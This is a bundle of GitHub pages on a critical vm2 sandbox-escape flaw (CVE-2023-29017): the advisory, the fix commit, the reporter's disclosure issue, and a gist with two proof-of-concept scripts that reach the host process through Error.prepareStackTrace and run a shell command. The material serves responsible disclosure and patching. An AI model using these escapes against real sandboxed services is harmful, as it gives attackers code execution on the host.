=== Content from github.com_9a176ebb_20250114_204757.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fsecurity%2Fadvisories%2FGHSA-7jxr-cg7f-gpgv)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fsecurity%2Fadvisories%2FGHSA-7jxr-cg7f-gpgv)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=patriksimek%2Fvm2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Jan 1, 2025. It is now read-only.

[patriksimek](/patriksimek)
/
**[vm2](/patriksimek/vm2)**
Public archive

* [Notifications](/login?return_to=%2Fpatriksimek%2Fvm2) You must be signed in to change notification settings
* [Fork
  297](/login?return_to=%2Fpatriksimek%2Fvm2)
* [Star
   3.9k](/login?return_to=%2Fpatriksimek%2Fvm2)

* [Code](/patriksimek/vm2)
* [Issues
  26](/patriksimek/vm2/issues)
* [Pull requests
  2](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects
  0](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

Additional navigation options

* [Code](/patriksimek/vm2)
* [Issues](/patriksimek/vm2/issues)
* [Pull requests](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

# Sandbox Escape

Critical

[patriksimek](/patriksimek)
published
GHSA-7jxr-cg7f-gpgv
Apr 6, 2023

## Package

npm

vm2
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<= 3.9.14

## Patched versions

3.9.15

## Description

vm2 was not properly handling host objects passed to `Error.prepareStackTrace` in case of unhandled async errors.

* vm2 version: ~3.9.14
* Node version: 18.15.0, 19.8.1, 17.9.1

### Impact

A threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.

### Patches

This vulnerability was patched in the release of version `3.9.15` of `vm2`.

### Workarounds

None.

### References

Github Issue - [#515](https://github.com/patriksimek/vm2/issues/515)

PoC - <https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d>

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [VM2](https://github.com/patriksimek/vm2)

Thanks to the research team in KAIST [WSP Lab](https://wsp-lab.github.io/) for disclosing this vulnerability.

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-29017

### Weaknesses

No CWEs

### Credits

* [![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=40&v=4)](/seongil-wi)
  [seongil-wi](/seongil-wi)
  Analyst
* [![@rectcoordsystem](https://avatars.githubusercontent.com/u/37621004?s=40&v=4)](/rectcoordsystem)
  [rectcoordsystem](/rectcoordsystem)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_395a87b5_20250114_204754.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fcommit%2Fd534e5785f38307b70d3aac1945260a261a94d50)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fcommit%2Fd534e5785f38307b70d3aac1945260a261a94d50)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=patriksimek%2Fvm2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Jan 1, 2025. It is now read-only.

[patriksimek](/patriksimek)
/
**[vm2](/patriksimek/vm2)**
Public archive

* [Notifications](/login?return_to=%2Fpatriksimek%2Fvm2) You must be signed in to change notification settings
* [Fork
  297](/login?return_to=%2Fpatriksimek%2Fvm2)
* [Star
   3.9k](/login?return_to=%2Fpatriksimek%2Fvm2)

* [Code](/patriksimek/vm2)
* [Issues
  26](/patriksimek/vm2/issues)
* [Pull requests
  2](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects
  0](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

Additional navigation options

* [Code](/patriksimek/vm2)
* [Issues](/patriksimek/vm2/issues)
* [Pull requests](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

## Commit

[Permalink](/patriksimek/vm2/commit/d534e5785f38307b70d3aac1945260a261a94d50)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Wrap host objects passes through prepareStackTrace

[Browse files](/patriksimek/vm2/tree/d534e5785f38307b70d3aac1945260a261a94d50)
Browse the repository at this point in the history

* Loading branch information

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=40&v=4)](/XmiliaH)

[XmiliaH](/patriksimek/vm2/commits?author=XmiliaH "View all commits by XmiliaH")
committed
Apr 6, 2023

1 parent
[e541782](/patriksimek/vm2/commit/e541782b7ff709c07676d07d982517d0591e5774)

commit d534e57

Showing
**1 changed file**
with
**21 additions**
and
**4 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

25 changes: 21 additions & 4 deletions

25
[lib/setup-sandbox.js](#diff-b1a515a627d820118e76d0e323fe2f0589ed50a1eacb490f6c3278fe3698f164 "lib/setup-sandbox.js")

Show comments

[View file](/patriksimek/vm2/blob/d534e5785f38307b70d3aac1945260a261a94d50/lib/setup-sandbox.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -276,13 +276,30 @@ if (typeof OriginalCallSite === 'function') { |
|  |  | return; |
|  |  | } |
|  |  | const newWrapped = (error, sst) => { |
|  |  | const sandboxSst = ensureThis(sst); |
|  |  | if (localArrayIsArray(sst)) { |
|  |  | for (let i=0; i < sst.length; i++) { |
|  |  | const cs = sst[i]; |
|  |  | if (typeof cs === 'object' && localReflectGetPrototypeOf(cs) === OriginalCallSite.prototype) { |
|  |  | sst[i] = new CallSite(cs); |
|  |  | if (sst === sandboxSst) { |
|  |  | for (let i=0; i < sst.length; i++) { |
|  |  | const cs = sst[i]; |
|  |  | if (typeof cs === 'object' && localReflectGetPrototypeOf(cs) === OriginalCallSite.prototype) { |
|  |  | sst[i] = new CallSite(cs); |
|  |  | } |
|  |  | } |
|  |  | } else { |
|  |  | sst = []; |
|  |  | for (let i=0; i < sandboxSst.length; i++) { |
|  |  | const cs = sandboxSst[i]; |
|  |  | localReflectDefineProperty(sst, i, { |
|  |  | \_\_proto\_\_: null, |
|  |  | value: new CallSite(cs), |
|  |  | enumerable: true, |
|  |  | configurable: true, |
|  |  | writable: true |
|  |  | }); |
|  |  | } |
|  |  | } |
|  |  | } else { |
|  |  | sst = sandboxSst; |
|  |  | } |
|  |  | return value(error, sst); |
|  |  | }; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `d534e57`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fcommit%2Fd534e5785f38307b70d3aac1945260a261a94d50) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_ccece7f3_20250114_204754.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=64&v=4)](/seongil-wi)

# [seongil-wi](/seongil-wi)/**[vm2\_3.9.14\_exploit\_1.js](/seongil-wi/2a44e082001b959bfe304b62121fb76d)** Secret

Created
April 6, 2023 15:30

Show Gist options

* [Download ZIP](/seongil-wi/2a44e082001b959bfe304b62121fb76d/archive/93ebc4b7182db2f10fc1bc3f39159b489281c178.zip)

* [Star
  (27)
  27](/login?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d)You must be signed in to star a gist
* [Fork
  (7)
  7](/login?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d.js&quot;&gt;&lt;/script&gt;
* Save seongil-wi/2a44e082001b959bfe304b62121fb76d to your computer and use it in GitHub Desktop.

[Code](/seongil-wi/2a44e082001b959bfe304b62121fb76d)
[Revisions
1](/seongil-wi/2a44e082001b959bfe304b62121fb76d/revisions)
[Stars
27](/seongil-wi/2a44e082001b959bfe304b62121fb76d/stargazers)
[Forks
7](/seongil-wi/2a44e082001b959bfe304b62121fb76d/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d.js&quot;&gt;&lt;/script&gt;

Save seongil-wi/2a44e082001b959bfe304b62121fb76d to your computer and use it in GitHub Desktop.

[Download ZIP](/seongil-wi/2a44e082001b959bfe304b62121fb76d/archive/93ebc4b7182db2f10fc1bc3f39159b489281c178.zip)

 [Raw](/seongil-wi/2a44e082001b959bfe304b62121fb76d/raw/93ebc4b7182db2f10fc1bc3f39159b489281c178/vm2_3.9.14_exploit_1.js)

[**vm2\_3.9.14\_exploit\_1.js**](#file-vm2_3-9-14_exploit_1-js)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | const {VM} = require("vm2"); |
| --- | --- |
|  | let vmInstance = new VM(); |
|  |  |
|  | const code = ` |
|  | Error.prepareStackTrace = (e, frames) => { |
|  | frames.constructor.constructor('return process')().mainModule.require('child\_process').execSync('touch flag'); |
|  | }; |
|  |  |
|  | (async ()=>{}).constructor('return process')() |
|  | ` |
|  |  |
|  | vmInstance.run(code); |

 [Raw](/seongil-wi/2a44e082001b959bfe304b62121fb76d/raw/93ebc4b7182db2f10fc1bc3f39159b489281c178/vm2_3.9.14_exploit_2.js)

[**vm2\_3.9.14\_exploit\_2.js**](#file-vm2_3-9-14_exploit_2-js)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | const {VM} = require("vm2"); |
| --- | --- |
|  | let vmInstance = new VM(); |
|  |  |
|  | const code = ` |
|  | Error.prepareStackTrace = (e, frames) => { |
|  | frames.constructor.constructor('return process')().mainModule.require('child\_process').execSync('touch flag'); |
|  | }; |
|  |  |
|  | async function aa(){ |
|  | eval("1=1") |
|  | } |
|  |  |
|  | aa() |
|  | ` |
|  |  |
|  | vmInstance.run(code); |

[![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=80&v=4)](/seongil-wi)

Copy link

Author

### **[seongil-wi](/seongil-wi)** commented [Apr 6, 2023](/seongil-wi/2a44e082001b959bfe304b62121fb76d?permalink_comment_id=4528658#gistcomment-4528658)

* Expected result: We can escape vm2 and execute arbitrary shellcode. In our PoC, a file called `flag' is written through the vulnerability.
* vm2 version: 3.9.14 (latest version)
* Node version: 18.15.0, 19.8.1, 17.9.1, ...
* Root cause: It seems that vm2 is not properly handling errors that occur in async functions.

Sorry, something went wrong.

[![@blindhacker99](https://avatars.githubusercontent.com/u/75206424?s=80&v=4)](/blindhacker99)

Copy link

### **[blindhacker99](/blindhacker99)** commented [May 8, 2023](/seongil-wi/2a44e082001b959bfe304b62121fb76d?permalink_comment_id=4561982#gistcomment-4561982) • edited Loading

[@seongil-wi](https://github.com/seongil-wi) Did you looked at the earlier issues reported by oxeye team here - <https://www.oxeye.io/resources/vm2-sandbreak-vulnerability-cve-2022-36067> ??

In oxeye team's report also the method for escaping the sandbox was typically same where attacker is using the prepareStackTrace() method to customise the CallStack() with escaping context scenario . I am mentioning the part of exploit here:

`globalThis.Error.prepareStackTrace = function(err, traces) {

traces[0].getThis().process.mainModule.require('child\_process')

```
// Here the author is exploiting the fact that CallSite array of stack frames is not sandboxed. Though the author is using one of the
     method here is getThis().

```

}`

I am curious about and trying to understand how this was fixed earlier. If the fix is happening in sort of blacklisting the different kinds of error or exception an attacker can raise?

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fseongil-wi%2F2a44e082001b959bfe304b62121fb76d)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c539cf81_20250114_204756.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fissues%2F515)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fissues%2F515)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=patriksimek%2Fvm2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Jan 1, 2025. It is now read-only.

[patriksimek](/patriksimek)
/
**[vm2](/patriksimek/vm2)**
Public archive

* [Notifications](/login?return_to=%2Fpatriksimek%2Fvm2) You must be signed in to change notification settings
* [Fork
  297](/login?return_to=%2Fpatriksimek%2Fvm2)
* [Star
   3.9k](/login?return_to=%2Fpatriksimek%2Fvm2)

* [Code](/patriksimek/vm2)
* [Issues
  26](/patriksimek/vm2/issues)
* [Pull requests
  2](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects
  0](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

Additional navigation options

* [Code](/patriksimek/vm2)
* [Issues](/patriksimek/vm2/issues)
* [Pull requests](/patriksimek/vm2/pulls)
* [Actions](/patriksimek/vm2/actions)
* [Projects](/patriksimek/vm2/projects)
* [Wiki](/patriksimek/vm2/wiki)
* [Security](/patriksimek/vm2/security)
* [Insights](/patriksimek/vm2/pulse)

# [VM2 Sandbox Escape] Vulnerability in vm2@3.9.14 #515

Closed

[seongil-wi](/seongil-wi) opened this issue
Apr 6, 2023
· 13 comments

Closed

# [[VM2 Sandbox Escape] Vulnerability in vm2@3.9.14](#top) #515

[seongil-wi](/seongil-wi) opened this issue
Apr 6, 2023
· 13 comments

Labels
[bug](/patriksimek/vm2/labels/bug)
[confirmed](/patriksimek/vm2/labels/confirmed)

## Comments

[![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=80&v=4)](/seongil-wi)

Copy link

### **[seongil-wi](/seongil-wi)** commented [Apr 6, 2023](#issue-1657669012) • edited Loading

| Hello team, I am Seongil Wi from KAIST in South Korea.  Our research team in KAIST [WSP Lab](https://wsp-lab.github.io/) found a sandbox escape bug in vm2@3.9.14.  Since this is a confidential issue, we have sent an e-mail with PoC to the administrators below, so please check it.   * [@XmiliaH](https://github.com/XmiliaH) [XmiliaH](https://github.com/XmiliaH) * [@patriksimek](https://github.com/patriksimek) ([patriksimek](https://github.com/patriksimek))   Thanks! |
| --- |
| The text was updated successfully, but these errors were encountered: |

 ❤️
12
 ivymarkwell, useafterfree, rotem-cider, sickcodes, S0obi, 2265865006, gun0317, AhnMo, cccs-kevin, patelkathan, and 2 more reacted with heart emoji

All reactions

* ❤️
  12 reactions

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [Apr 6, 2023](#issuecomment-1499320936)

| Thanks for the report. |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=40&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)
[XmiliaH](/XmiliaH)
added
[bug](/patriksimek/vm2/labels/bug)
[confirmed](/patriksimek/vm2/labels/confirmed)
labels
[Apr 6, 2023](#event-8947726721)

[![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=80&v=4)](/seongil-wi)

Copy link

Author

### **[seongil-wi](/seongil-wi)** commented [Apr 6, 2023](#issuecomment-1499347927)

| Hello [@patriksimek](https://github.com/patriksimek) ,  Could you please open a security advisory for this vulnerability? |
| --- |

All reactions

Sorry, something went wrong.

[![@patriksimek](https://avatars.githubusercontent.com/u/1000058?s=80&u=2d29bb0e062ee7253c28d2b94586fe1320936c80&v=4)](/patriksimek)

Copy link

Owner

### **[patriksimek](/patriksimek)** commented [Apr 6, 2023](#issuecomment-1499356176)

| [@seongil-wi](https://github.com/seongil-wi) Just opened it. Thank you for reporting the issue. [@XmiliaH](https://github.com/XmiliaH) Thank you for such a quick reaction and the patch. |
| --- |

All reactions

Sorry, something went wrong.

